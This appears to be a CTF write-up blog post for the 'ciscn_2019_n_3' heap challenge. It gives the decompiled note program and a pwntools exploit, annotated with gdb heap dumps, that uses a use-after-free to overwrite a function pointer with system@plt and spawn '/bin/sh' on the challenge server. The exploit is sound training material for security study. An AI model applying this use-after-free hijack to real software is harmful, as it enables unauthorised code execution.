---
layout: post
title:  ciscn_2019_n_3
date:   2021-02-27 00:01:01 +0300
image:  2021-02-27-butterfly.jpg
tags:   [ctf,Pwn,ciscn2019,ubuntu18,heap]
---

#### main()

```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  float v5; // [esp+1Ch] [ebp-Ch]

  alarm(0x12Cu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("================================================================================");
  puts(&byte_8048D45);
  puts("\tCloud Note (Free Edition)");
  puts("Free Edition can only use within 300 seconds");
  puts("Profession Edition only sale $9.999999");
  system("date");
  puts("================================================================================");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts("1. New note");
          puts("2. Del note");
          puts("3. Show note");
          puts("4. Purchase Pro Edition");
          v5 = (long double)rand() / 2147483600.0 * 9.0;
          v3 = ask((int)"CNote");
          if ( v3 != 2 )
            break;
          do_del();
        }
        if ( v3 > 2 )
          break;
        if ( v3 != 1 )
          goto LABEL_13;
        do_new();
      }
      if ( v3 != 3 )
        break;
      do_dump();
    }
    if ( v3 != 4 )
      break;
    printf("\tBalance: %f\n", v5);
    puts("\tYou dont have enough money!\n");
  }
LABEL_13:
  puts("Thanks for using CNote! Bye~");
  return 0;
}
```

#### new()

```assembly
int do_new()
{
  int v1; // eax
  int v2; // [esp+0h] [ebp-18h]
  int v3; // [esp+4h] [ebp-14h]
  unsigned int size; // [esp+Ch] [ebp-Ch]

  v2 = ask((int)"Index");
  if ( v2 < 0 || v2 > 16 )
    return puts("Out of index!");
  if ( records[v2] )
    return printf("Index #%d is used!\n", v2);
  records[v2] = (int)malloc(0xCu);
  v3 = records[v2];
  *(_DWORD *)v3 = rec_int_print;
  *(_DWORD *)(v3 + 4) = rec_int_free;
  puts("Blob type:");
  puts("1. Integer");
  puts("2. Text");
  v1 = ask((int)"Type");
  if ( v1 == 1 )
  {
    *(_DWORD *)(v3 + 8) = ask((int)"Value");
  }
  else
  {
    if ( v1 != 2 )
      return puts("Invalid type!");
    size = ask((int)"Length");
    if ( size > 0x400 )
      return puts("Length too long, please buy pro edition to store longer note!");
    *(_DWORD *)(v3 + 8) = malloc(size);
    printf("Value > ");
    fgets(*(char **)(v3 + 8), size, stdin);
    *(_DWORD *)v3 = rec_str_print;
    *(_DWORD *)(v3 + 4) = rec_str_free;
  }
  puts("Okey, got your data. Here is it:");
  return (*(int (__cdecl **)(int))v3)(v3);
}
```

#### del()

```assembly
int do_del()
{
  int v0; // eax

  v0 = ask((int)"Index");
  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);
}
```

#### show()

```assembly
int do_dump()
{
  int v0; // eax

  v0 = ask((int)"Index");
  return (*(int (__cdecl **)(int))records[v0])(records[v0]);
}
```

#### exp:

```assembly
from pwn import *

# io = process("./ciscn_2019_n_3")
io = remote("node3.buuoj.cn", 25559)

def new(idx,type,value,length=0):
    io.recvuntil("CNote > ")
    io.sendline(str(1))
    io.recvuntil("Index > ")
    io.sendline(str(idx))
    io.recvuntil("Type > ")
    io.sendline(str(type))
    if type == 1:
        io.recvuntil("Value > ")
        io.sendline(str(value))
    else:
        io.recvuntil("Length > ")
        io.sendline(str(length))
        io.recvuntil("Value > ")
        if length == 8:
            io.send(value)
        else:
            io.sendline(value)

def delete(idx):
    io.recvuntil("CNote > ")
    io.sendline(str(2))
    io.recvuntil("Index > ")
    io.sendline(str(idx))

def show(idx):
    io.recvuntil("CNote > ")
    io.sendline(str(3))
    io.recvuntil("Index > ")
    io.sendline(str(idx))

new(0, 2, "a"*10, 0x88)
''''
0x8895000:	0x0000000000000000	0x0000015100000000
0x8895010:	0x0000000000000000	0x0000000000000000
0x8895020:	0x0000000000000000	0x0000000000000000
0x8895030:	0x0000000000000000	0x0000000000000000
0x8895040:	0x0000000000000000	0x0000000000000000
0x8895050:	0x0000000000000000	0x0000000000000000
0x8895060:	0x0000000000000000	0x0000000000000000
0x8895070:	0x0000000000000000	0x0000000000000000
0x8895080:	0x0000000000000000	0x0000000000000000
0x8895090:	0x0000000000000000	0x0000000000000000
0x88950a0:	0x0000000000000000	0x0000000000000000
0x88950b0:	0x0000000000000000	0x0000000000000000
0x88950c0:	0x0000000000000000	0x0000000000000000
0x88950d0:	0x0000000000000000	0x0000000000000000
0x88950e0:	0x0000000000000000	0x0000000000000000
0x88950f0:	0x0000000000000000	0x0000000000000000
0x8895100:	0x0000000000000000	0x0000000000000000
0x8895110:	0x0000000000000000	0x0000000000000000
0x8895120:	0x0000000000000000	0x0000000000000000
0x8895130:	0x0000000000000000	0x0000000000000000
0x8895140:	0x0000000000000000	0x0000000000000000
0x8895150:	0x0000000000000000	0x0000001100000000 0
0x8895160:	0x08048725080486de	0x0000009108895170
0x8895170:	0x6161616161616161	0x00000000000a6161
0x8895180:	0x0000000000000000	0x0000000000000000
0x8895190:	0x0000000000000000	0x0000000000000000
0x88951a0:	0x0000000000000000	0x0000000000000000
0x88951b0:	0x0000000000000000	0x0000000000000000
0x88951c0:	0x0000000000000000	0x0000000000000000
0x88951d0:	0x0000000000000000	0x0000000000000000
0x88951e0:	0x0000000000000000	0x0000000000000000
0x88951f0:	0x0000000000000000
'''

new(1, 2, "b"*10, 0x38)
'''
0x889d000:	0x0000000000000000	0x0000015100000000
0x889d010:	0x0000000000000000	0x0000000000000000
0x889d020:	0x0000000000000000	0x0000000000000000
0x889d030:	0x0000000000000000	0x0000000000000000
0x889d040:	0x0000000000000000	0x0000000000000000
0x889d050:	0x0000000000000000	0x0000000000000000
0x889d060:	0x0000000000000000	0x0000000000000000
0x889d070:	0x0000000000000000	0x0000000000000000
0x889d080:	0x0000000000000000	0x0000000000000000
0x889d090:	0x0000000000000000	0x0000000000000000
0x889d0a0:	0x0000000000000000	0x0000000000000000
0x889d0b0:	0x0000000000000000	0x0000000000000000
0x889d0c0:	0x0000000000000000	0x0000000000000000
0x889d0d0:	0x0000000000000000	0x0000000000000000
0x889d0e0:	0x0000000000000000	0x0000000000000000
0x889d0f0:	0x0000000000000000	0x0000000000000000
0x889d100:	0x0000000000000000	0x0000000000000000
0x889d110:	0x0000000000000000	0x0000000000000000
0x889d120:	0x0000000000000000	0x0000000000000000
0x889d130:	0x0000000000000000	0x0000000000000000
0x889d140:	0x0000000000000000	0x0000000000000000
0x889d150:	0x0000000000000000	0x0000001100000000 0
0x889d160:	0x08048725080486de	0x000000910889d170
0x889d170:	0x6161616161616161	0x00000000000a6161
0x889d180:	0x0000000000000000	0x0000000000000000
0x889d190:	0x0000000000000000	0x0000000000000000
0x889d1a0:	0x0000000000000000	0x0000000000000000
0x889d1b0:	0x0000000000000000	0x0000000000000000
0x889d1c0:	0x0000000000000000	0x0000000000000000
0x889d1d0:	0x0000000000000000	0x0000000000000000
0x889d1e0:	0x0000000000000000	0x0000000000000000
0x889d1f0:	0x0000000000000000	0x0000001100000000 1
0x889d200:	0x08048725080486de	0x000000410889d210
0x889d210:	0x6262626262626262	0x00000000000a6262
0x889d220:	0x0000000000000000	0x0000000000000000
0x889d230:	0x0000000000000000	0x0000000000000000
0x889d240:	0x0000000000000000
'''

new(2, 1, 0x41)
'''
0x8d5f000:	0x0000000000000000	0x0000015100000000
0x8d5f010:	0x0000000000000000	0x0000000000000000
0x8d5f020:	0x0000000000000000	0x0000000000000000
0x8d5f030:	0x0000000000000000	0x0000000000000000
0x8d5f040:	0x0000000000000000	0x0000000000000000
0x8d5f050:	0x0000000000000000	0x0000000000000000
0x8d5f060:	0x0000000000000000	0x0000000000000000
0x8d5f070:	0x0000000000000000	0x0000000000000000
0x8d5f080:	0x0000000000000000	0x0000000000000000
0x8d5f090:	0x0000000000000000	0x0000000000000000
0x8d5f0a0:	0x0000000000000000	0x0000000000000000
0x8d5f0b0:	0x0000000000000000	0x0000000000000000
0x8d5f0c0:	0x0000000000000000	0x0000000000000000
0x8d5f0d0:	0x0000000000000000	0x0000000000000000
0x8d5f0e0:	0x0000000000000000	0x0000000000000000
0x8d5f0f0:	0x0000000000000000	0x0000000000000000
0x8d5f100:	0x0000000000000000	0x0000000000000000
0x8d5f110:	0x0000000000000000	0x0000000000000000
0x8d5f120:	0x0000000000000000	0x0000000000000000
0x8d5f130:	0x0000000000000000	0x0000000000000000
0x8d5f140:	0x0000000000000000	0x0000000000000000
0x8d5f150:	0x0000000000000000	0x0000001100000000 0
0x8d5f160:	0x08048725080486de	0x0000009108d5f170
0x8d5f170:	0x6161616161616161	0x00000000000a6161
0x8d5f180:	0x0000000000000000	0x0000000000000000
0x8d5f190:	0x0000000000000000	0x0000000000000000
0x8d5f1a0:	0x0000000000000000	0x0000000000000000
0x8d5f1b0:	0x0000000000000000	0x0000000000000000
0x8d5f1c0:	0x0000000000000000	0x0000000000000000
0x8d5f1d0:	0x0000000000000000	0x0000000000000000
0x8d5f1e0:	0x0000000000000000	0x0000000000000000
0x8d5f1f0:	0x0000000000000000	0x0000001100000000 1
0x8d5f200:	0x08048725080486de	0x0000004108d5f210
0x8d5f210:	0x6262626262626262	0x00000000000a6262
0x8d5f220:	0x0000000000000000	0x0000000000000000
0x8d5f230:	0x0000000000000000	0x0000000000000000
0x8d5f240:	0x0000000000000000	0x0000001100000000 2
0x8d5f250:	0x080486fe080486be	0x00021da900000041
'''

delete(1)
'''
0x976c000:	0x0000000000000000	0x0000015100000000
0x976c010:	0x0000000001000001	0x0000000000000000
0x976c020:	0x0000000000000000	0x0000000000000000
0x976c030:	0x0000000000000000	0x0000000000000000
0x976c040:	0x0000000000000000	0x0000000000000000
0x976c050:	0x000000000976c200	0x0976c21000000000
0x976c060:	0x0000000000000000	0x0000000000000000
0x976c070:	0x0000000000000000	0x0000000000000000
0x976c080:	0x0000000000000000	0x0000000000000000
0x976c090:	0x0000000000000000	0x0000000000000000
0x976c0a0:	0x0000000000000000	0x0000000000000000
0x976c0b0:	0x0000000000000000	0x0000000000000000
0x976c0c0:	0x0000000000000000	0x0000000000000000
0x976c0d0:	0x0000000000000000	0x0000000000000000
0x976c0e0:	0x0000000000000000	0x0000000000000000
0x976c0f0:	0x0000000000000000	0x0000000000000000
0x976c100:	0x0000000000000000	0x0000000000000000
0x976c110:	0x0000000000000000	0x0000000000000000
0x976c120:	0x0000000000000000	0x0000000000000000
0x976c130:	0x0000000000000000	0x0000000000000000
0x976c140:	0x0000000000000000	0x0000000000000000
0x976c150:	0x0000000000000000	0x0000001100000000 0
0x976c160:	0x08048725080486de	0x000000910976c170
0x976c170:	0x6161616161616161	0x00000000000a6161
0x976c180:	0x0000000000000000	0x0000000000000000
0x976c190:	0x0000000000000000	0x0000000000000000
0x976c1a0:	0x0000000000000000	0x0000000000000000
0x976c1b0:	0x0000000000000000	0x0000000000000000
0x976c1c0:	0x0000000000000000	0x0000000000000000
0x976c1d0:	0x0000000000000000	0x0000000000000000
0x976c1e0:	0x0000000000000000	0x0000000000000000
0x976c1f0:	0x0000000000000000	0x0000001100000000 # 1
0x976c200:	0x0976c01000000000	0x000000410976c210
0x976c210:	0x0976c01000000000	0x00000000000a6262
0x976c220:	0x0000000000000000	0x0000000000000000
0x976c230:	0x0000000000000000	0x0000000000000000
0x976c240:	0x0000000000000000	0x0000001100000000 2
0x976c250:	0x080486fe080486be	0x00021da900000041
'''

delete(2)
'''
0x9626000:	0x0000000000000000	0x0000015100000000
0x9626010:	0x0000000001000002	0x0000000000000000
0x9626020:	0x0000000000000000	0x0000000000000000
0x9626030:	0x0000000000000000	0x0000000000000000
0x9626040:	0x0000000000000000	0x0000000000000000
0x9626050:	0x0000000009626250	0x0962621000000000
0x9626060:	0x0000000000000000	0x0000000000000000
0x9626070:	0x0000000000000000	0x0000000000000000
0x9626080:	0x0000000000000000	0x0000000000000000
0x9626090:	0x0000000000000000	0x0000000000000000
0x96260a0:	0x0000000000000000	0x0000000000000000
0x96260b0:	0x0000000000000000	0x0000000000000000
0x96260c0:	0x0000000000000000	0x0000000000000000
0x96260d0:	0x0000000000000000	0x0000000000000000
0x96260e0:	0x0000000000000000	0x0000000000000000
0x96260f0:	0x0000000000000000	0x0000000000000000
0x9626100:	0x0000000000000000	0x0000000000000000
0x9626110:	0x0000000000000000	0x0000000000000000
0x9626120:	0x0000000000000000	0x0000000000000000
0x9626130:	0x0000000000000000	0x0000000000000000
0x9626140:	0x0000000000000000	0x0000000000000000
0x9626150:	0x0000000000000000	0x0000001100000000 0
0x9626160:	0x08048725080486de	0x0000009109626170
0x9626170:	0x6161616161616161	0x00000000000a6161
0x9626180:	0x0000000000000000	0x0000000000000000
0x9626190:	0x0000000000000000	0x0000000000000000
0x96261a0:	0x0000000000000000	0x0000000000000000
0x96261b0:	0x0000000000000000	0x0000000000000000
0x96261c0:	0x0000000000000000	0x0000000000000000
0x96261d0:	0x0000000000000000	0x0000000000000000
0x96261e0:	0x0000000000000000	0x0000000000000000
0x96261f0:	0x0000000000000000	0x0000001100000000 # 1
0x9626200:	0x0962601000000000	0x0000004109626210
0x9626210:	0x0962601000000000	0x00000000000a6262
0x9626220:	0x0000000000000000	0x0000000000000000
0x9626230:	0x0000000000000000	0x0000000000000000
0x9626240:	0x0000000000000000	0x0000001100000000 # 2
0x9626250:	0x0962601009626200	0x00021da900000041
'''

system_plt = 0x8048500
new(3, 2, "dash" + p32(system_plt), 0xc)
'''
0x80a2000:	0x0000000000000000	0x0000015100000000
0x80a2010:	0x0000000001000000	0x0000000000000000
0x80a2020:	0x0000000000000000	0x0000000000000000
0x80a2030:	0x0000000000000000	0x0000000000000000
0x80a2040:	0x0000000000000000	0x0000000000000000
0x80a2050:	0x0000000000000000	0x080a221000000000
0x80a2060:	0x0000000000000000	0x0000000000000000
0x80a2070:	0x0000000000000000	0x0000000000000000
0x80a2080:	0x0000000000000000	0x0000000000000000
0x80a2090:	0x0000000000000000	0x0000000000000000
0x80a20a0:	0x0000000000000000	0x0000000000000000
0x80a20b0:	0x0000000000000000	0x0000000000000000
0x80a20c0:	0x0000000000000000	0x0000000000000000
0x80a20d0:	0x0000000000000000	0x0000000000000000
0x80a20e0:	0x0000000000000000	0x0000000000000000
0x80a20f0:	0x0000000000000000	0x0000000000000000
0x80a2100:	0x0000000000000000	0x0000000000000000
0x80a2110:	0x0000000000000000	0x0000000000000000
0x80a2120:	0x0000000000000000	0x0000000000000000
0x80a2130:	0x0000000000000000	0x0000000000000000
0x80a2140:	0x0000000000000000	0x0000000000000000
0x80a2150:	0x0000000000000000	0x0000001100000000 0
0x80a2160:	0x08048725080486de	0x00000091080a2170
0x80a2170:	0x6161616161616161	0x00000000000a6161
0x80a2180:	0x0000000000000000	0x0000000000000000
0x80a2190:	0x0000000000000000	0x0000000000000000
0x80a21a0:	0x0000000000000000	0x0000000000000000
0x80a21b0:	0x0000000000000000	0x0000000000000000
0x80a21c0:	0x0000000000000000	0x0000000000000000
0x80a21d0:	0x0000000000000000	0x0000000000000000
0x80a21e0:	0x0000000000000000	0x0000000000000000
0x80a21f0:	0x0000000000000000	0x0000001100000000 1
0x80a2200:	0x0804850068736162	0x00000041080a000a 3->value
0x80a2210:	0x080a201000000000	0x00000000000a6262 1->value
0x80a2220:	0x0000000000000000	0x0000000000000000
0x80a2230:	0x0000000000000000	0x0000000000000000
0x80a2240:	0x0000000000000000	0x0000001100000000 2/3
0x80a2250:	0x08048725080486de	0x00021da9080a2200
'''

new(4, 2, "/bin/sh\x00", 0x38)
'''
0x8d96000:	0x0000000000000000	0x0000015100000000
0x8d96010:	0x0000000000000000	0x0000000000000000
0x8d96020:	0x0000000000000000	0x0000000000000000
0x8d96030:	0x0000000000000000	0x0000000000000000
0x8d96040:	0x0000000000000000	0x0000000000000000
0x8d96050:	0x0000000000000000	0x0000000000000000
0x8d96060:	0x0000000000000000	0x0000000000000000
0x8d96070:	0x0000000000000000	0x0000000000000000
0x8d96080:	0x0000000000000000	0x0000000000000000
0x8d96090:	0x0000000000000000	0x0000000000000000
0x8d960a0:	0x0000000000000000	0x0000000000000000
0x8d960b0:	0x0000000000000000	0x0000000000000000
0x8d960c0:	0x0000000000000000	0x0000000000000000
0x8d960d0:	0x0000000000000000	0x0000000000000000
0x8d960e0:	0x0000000000000000	0x0000000000000000
0x8d960f0:	0x0000000000000000	0x0000000000000000
0x8d96100:	0x0000000000000000	0x0000000000000000
0x8d96110:	0x0000000000000000	0x0000000000000000
0x8d96120:	0x0000000000000000	0x0000000000000000
0x8d96130:	0x0000000000000000	0x0000000000000000
0x8d96140:	0x0000000000000000	0x0000000000000000
0x8d96150:	0x0000000000000000	0x0000001100000000 0
0x8d96160:	0x08048725080486de	0x0000009108d96170
0x8d96170:	0x6161616161616161	0x00000000000a6161
0x8d96180:	0x0000000000000000	0x0000000000000000
0x8d96190:	0x0000000000000000	0x0000000000000000
0x8d961a0:	0x0000000000000000	0x0000000000000000
0x8d961b0:	0x0000000000000000	0x0000000000000000
0x8d961c0:	0x0000000000000000	0x0000000000000000
0x8d961d0:	0x0000000000000000	0x0000000000000000
0x8d961e0:	0x0000000000000000	0x0000000000000000
0x8d961f0:	0x0000000000000000	0x0000001100000000 1
0x8d96200:	0x0804850068736162	0x0000004108d9000a 3->value
0x8d96210:	0x0068732f6e69622f	0x00000000000a000a 1->value/4->value
0x8d96220:	0x0000000000000000	0x0000000000000000
0x8d96230:	0x0000000000000000	0x0000000000000000
0x8d96240:	0x0000000000000000	0x0000001100000000 2/3
0x8d96250:	0x08048725080486de	0x0000001108d96200 4
0x8d96260:	0x08048725080486de	0x00021d9908d96210
'''

delete(1)

# gdb.attach(io)
# raw_input()

io.interactive()
```

